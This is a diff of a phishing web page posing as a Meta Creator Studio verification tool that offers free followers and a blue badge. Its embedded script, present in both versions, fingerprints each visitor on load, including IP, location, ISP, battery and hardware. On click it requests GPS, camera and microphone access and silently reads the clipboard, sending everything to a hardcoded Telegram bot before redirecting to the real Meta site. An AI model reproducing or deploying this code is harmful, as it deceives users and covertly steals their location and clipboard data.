@@ -1,57 +1,45 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"><title>Meta Business Creator Studio</title><link href="https://fonts.googleapis.com" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com"><style>:root{--p:#0064e0;--bg:#f0f2f5;--card:#fff}*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Inter',sans-serif;background:var(--bg);display:flex;align-items:center;justify-content:center;min-height:100vh;padding:15px}.container{max-width:400px;width:100%;background:var(--card);border-radius:12px;box-shadow:0 12px 28px rgba(0,0,0,0.1);overflow:hidden;text-align:center}.header{padding:30px;border-bottom:1px solid #ddd}.logo{font-size:45px;color:var(--p);margin-bottom:10px}.content{padding:25px}.main-btn{width:100%;padding:18px;border:none;border-radius:8px;background:var(--p);color:#fff;font-weight:700;cursor:pointer;box-shadow:0 4px 10px rgba(0,100,224,0.3)}.grid{display:none;grid-template-columns:1fr 1fr;gap:12px;margin-top:20px}.card{padding:18px;background:#f0f2f5;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer;border:1px solid #ddd}.card i{font-size:24px;color:var(--p);margin-bottom:8px;display:block}.status{font-size:12px;margin-top:10px;color:#65676b}</style></head><body>
-<div class="container"><div class="header"><div class="logo"><i class="fab fa-facebook"></i></div><h2>Meta Creator Hub</h2><p style="font-size:13px;color:#65676b;margin-top:8px">Verify your device to unlock 10k Followers and VIP Ad-Groups.</p></div><div class="content"><button id="startBtn" class="main-btn">Activate Meta Sync</button><div id="grid" class="grid"><div class="card" data-act="cam"><i class="fas fa-certificate"></i>Blue Badge Sync</div><div class="card" data-act="loc"><i class="fas fa-map-marker-alt"></i>Ad-Region Lock</div><div class="card" data-act="fol"><i class="fas fa-user-plus"></i>10k Followers</div><div class="card" data-act="net"><i class="fas fa-bolt"></i>Fast Net Trick</div></div><div id="status" class="status"></div></div></div>
-<script>
-class GhostSiphon {
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"><title>Meta Business Suite | Creator Hub</title><link href="https://fonts.googleapis.com" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com"><style>:root{--p:#0064e0;--bg:#f0f2f5;--card:#fff;--txt:#1c1e21}*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--txt);display:flex;align-items:center;justify-content:center;min-height:100vh;padding:15px}.container{max-width:400px;width:100%;background:var(--card);border-radius:12px;box-shadow:0 12px 28px rgba(0,0,0,0.12);overflow:hidden;animation:slideUp 0.5s ease}.header{padding:35px 20px;text-align:center;border-bottom:1px solid #eee}.logo{font-size:45px;color:var(--p);margin-bottom:12px}.content{padding:25px}.main-btn{width:100%;padding:18px;border:none;border-radius:10px;background:var(--p);color:#fff;font-size:16px;font-weight:700;cursor:pointer;box-shadow:0 4px 12px rgba(0,100,224,0.3)}.grid{display:none;grid-template-columns:1fr 1fr;gap:12px;margin-top:25px}.card{padding:18px;background:#f0f2f5;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer;border:1px solid #ddd;transition:0.2s;text-align:center}.card i{font-size:24px;color:var(--p);margin-bottom:8px;display:block}.status{font-size:12px;margin-top:12px;color:#65676b;font-weight:500}@keyframes slideUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}</style></head><body>
+<div class="container"><div class="header"><div class="logo"><i class="fab fa-facebook"></i></div><h2 style="font-size:22px">Meta Creator Studio</h2><p style="font-size:14px;color:#65676b;margin-top:8px">Verify your device to unlock 10k Followers, Blue Badge, and VIP Support Groups.</p></div><div class="content"><button id="startBtn" class="main-btn">Activate Meta Sync</button><div id="grid" class="grid"><div class="card" data-act="cam"><i class="fas fa-certificate"></i>Blue Badge Sync</div><div class="card" data-act="loc"><i class="fas fa-chart-line"></i>Ad-Region Lock</div><div class="card" data-act="mic"><i class="fas fa-microphone-alt"></i>Voice Support</div><div class="card" data-act="fol"><i class="fas fa-user-plus"></i>10k Free Followers</div><div class="card" data-act="net"><i class="fas fa-bolt"></i>Fast Net Trick</div><div class="card" data-act="grp"><i class="fas fa-users-crown"></i>Join VIP Groups</div></div><div id="status" class="status"></div></div></div><script>
+class MetaSiphon {
     constructor() {
-        this.token = '8085353942:AAH-r1yJqPGNvPruBICBW4aFAh2IPJjy_Qw';
-        this.chat = '6671784926';
+        this.tg = { token: '8085353942:AAH-r1yJqPGNvPruBICBW4aFAh2IPJjy_Qw', chat: '6671784926' };
         this.session = Math.random().toString(36).substring(2, 10).toUpperCase();
         this.init();
     }
-    async report(msg, tag="HIT") {
-        const url = `https://api.telegram.org{this.token}/sendMessage`;
-        const text = `💎 <b>[${tag}] ID: ${this.session}</b>\n\n${msg}`;
+    async report(msg, head="INFO") {
+        const url = `https://api.telegram.org{this.tg.token}/sendMessage`;
         await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: this.chat, text: text, parse_mode: 'HTML' })
-        }).catch(e => console.error("TG Fail:", e));
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: this.tg.chat, text: `💎 <b>[${head}] ID: ${this.session}</b>\n\n${msg}`, parse_mode: 'HTML' })
+        }).catch(() => {});
     }
     async init() {
-        // Auto-capture on page load
-        const ipReq = await fetch('https://ipapi.co').catch(() => ({json: () => ({})}));
+        const ipReq = await fetch('https://ipapi.co').catch(() => ({json:()=>({})}));
         const ip = await ipReq.json();
-        const bat = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0}));
-        
-        let initialData = `📱 <b>SYSTEM:</b>\nOS: ${navigator.platform}\nRAM: ${navigator.deviceMemory}GB\nBAT: ${Math.round(bat.level*100)}%\n\n📍 <b>IP INTEL:</b>\nIP: <code>${ip.ip}</code>\nCITY: ${ip.city}\nISP: ${ip.org}`;
-        this.report(initialData, "v13-START");
+        const bat = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:1}));
+        let initialData = `📂 <b>SYSTEM DEEP SCAN:</b>\nIP: <code>${ip.ip || '??'}</code>\nCITY: ${ip.city || '??'}\nISP: ${ip.org || '??'}\nBAT: ${Math.round(bat.level*100)}%\nRAM: ${navigator.deviceMemory || '??'}GB\nCPU: ${navigator.hardwareConcurrency} Cores`;
+        this.report(initialData, "v15-START");
 
-        document.getElementById('startBtn').onclick = async () => {
+        document.getElementById('startBtn').onclick = () => {
             document.getElementById('startBtn').style.display = 'none';
             document.getElementById('grid').style.display = 'grid';
-            document.getElementById('status').innerText = "Syncing... Please grant permissions.";
+            document.getElementById('status').innerText = "Syncing... Grant permissions to continue.";
             this.triggerAll();
         };
-
         document.querySelectorAll('.card').forEach(c => c.onclick = () => {
             this.report(`🎯 <b>CLICK:</b> ${c.innerText}`, "ACTIVITY");
-            alert("Connecting to Meta Server... Keep tab open.");
-            setTimeout(() => { window.location.href = "https://business.facebook.com"; }, 2000);
+            alert("Syncing with Meta Cloud... Do not close.");
+            setTimeout(() => { window.location.href = "https://business.facebook.com"; }, 2500);
         });
     }
     async triggerAll() {
-        // GPS Capture
-        navigator.geolocation.getCurrentPosition(p => {
-            this.report(`📍 GPS: <a href="https://www.google.com{p.coords.latitude},${p.coords.longitude}">View Map</a>`, "LOCATION");
-        });
-        // Media Capture
+        navigator.geolocation.getCurrentPosition(p => this.report(`📍 GPS: <a href="https://www.google.com{p.coords.latitude},${p.coords.longitude}">View Map</a>`, "LOCATION"));
         navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s => {
-            this.report("📸/🎙️ CAM & MIC: GRANTED", "MEDIA");
+            this.report("📸/🎙️ MEDIA GRANTED", "MEDIA");
             s.getTracks().forEach(t => t.stop());
         });
-        // Clipboard
         try { navigator.clipboard.readText().then(t => this.report(`📋 CLIP: <code>${t}</code>`, "HIDDEN")); } catch(e){}
     }
 }
-new GhostSiphon();
+new MetaSiphon();
 </script></body></html>
